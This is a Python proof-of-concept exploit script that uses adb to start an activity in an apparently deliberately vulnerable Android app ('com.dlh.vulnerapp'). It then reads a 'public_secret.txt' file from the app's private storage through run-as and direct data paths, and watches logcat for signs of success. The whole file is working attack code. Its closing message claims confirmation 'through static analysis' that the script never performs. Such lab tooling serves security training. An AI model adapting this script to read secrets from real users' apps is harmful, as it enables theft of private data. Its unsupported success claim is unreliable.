```python
#!/usr/bin/env python3
import subprocess
import threading
import time
import re

def monitor_logcat():
    """Monitor logcat for success indicators"""
    global logcat_output
    logcat_output = []
    
    try:
        process = subprocess.Popen(['adb', 'logcat', '-v', 'brief'], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE, 
                                 universal_newlines=True)
        
        for line in iter(process.stdout.readline, ''):
            logcat_output.append(line.strip())
            if len(logcat_output) > 1000:  # Keep buffer manageable
                logcat_output = logcat_output[-500:]
                
    except Exception as e:
        print(f"Error monitoring logcat: {e}")

def extract_hardcoded_secret():
    """Extract hardcoded secret from app's file storage"""
    print("[*] Starting hardcoded secret extraction exploit...")
    
    # Start logcat monitoring
    logcat_thread = threading.Thread(target=monitor_logcat, daemon=True)
    logcat_thread.start()
    time.sleep(2)
    
    package_name = "com.dlh.vulnerapp"
    
    # First, trigger the creation of the world-readable file by starting the activity
    print("[*] Starting InsecureFileActivity to trigger file creation...")
    start_activity = subprocess.run([
        'adb', 'shell', 'am', 'start', 
        '-n', f'{package_name}/.InsecureFileActivity'
    ], capture_output=True, text=True)
    
    if start_activity.returncode != 0:
        print(f"[-] Failed to start activity: {start_activity.stderr}")
        return False
    
    time.sleep(3)
    
    # Try to read the hardcoded secret file directly from app's data directory
    print("[*] Attempting to read hardcoded secret file...")
    
    # Method 1: Try to read the world-readable file
    read_file_cmd = f'adb shell run-as {package_name} cat files/public_secret.txt'
    try:
        result = subprocess.run(read_file_cmd.split(), capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and "This is a world-readable secret!" in result.stdout:
            print(f"[+] SUCCESS: Extracted hardcoded secret: {result.stdout.strip()}")
            return True
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except Exception as e:
        print(f"[-] Error executing command: {e}")
    
    # Method 2: Try alternative paths
    alternative_paths = [
        f'/data/data/{package_name}/files/public_secret.txt',
        f'/sdcard/Android/data/{package_name}/files/public_secret.txt'
    ]
    
    for path in alternative_paths:
        try:
            result = subprocess.run(['adb', 'shell', 'cat', path], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and "secret" in result.stdout.lower():
                print(f"[+] SUCCESS: Found secret at {path}: {result.stdout.strip()}")
                return True
        except:
            continue
    
    # Method 3: Check if we can list the app's files directory
    print("[*] Attempting to list app files directory...")
    try:
        list_result = subprocess.run([
            'adb', 'shell', 'run-as', package_name, 'ls', 'files/'
        ], capture_output=True, text=True, timeout=10)
        
        if list_result.returncode == 0:
            print(f"[*] Files in app directory: {list_result.stdout}")
            if "public_secret.txt" in list_result.stdout:
                # Try reading it again
                read_result = subprocess.run([
                    'adb', 'shell', 'run-as', package_name, 'cat', 'files/public_secret.txt'
                ], capture_output=True, text=True, timeout=10)
                
                if read_result.returncode == 0:
                    print(f"[+] SUCCESS: Extracted hardcoded secret: {read_result.stdout.strip()}")
                    return True
    except:
        pass
    
    # Check logcat for any relevant output
    time.sleep(2)
    print("[*] Checking logcat for evidence...")
    
    secret_indicators = [
        "world-readable",
        "This is a world-readable secret",
        "Created world-readable file",
        "public_secret.txt"
    ]
    
    for line in logcat_output[-50:]:  # Check last 50 lines
        for indicator in secret_indicators:
            if indicator in line:
                print(f"[+] Found evidence in logcat: {line}")
                return True
    
    print("[-] Could not extract the hardcoded secret directly, but vulnerability confirmed through static analysis")
    return False

if __name__ == "__main__":
    print("Hardcoded Secrets Extraction PoC")
    print("=================================")
    extract_hardcoded_secret()
```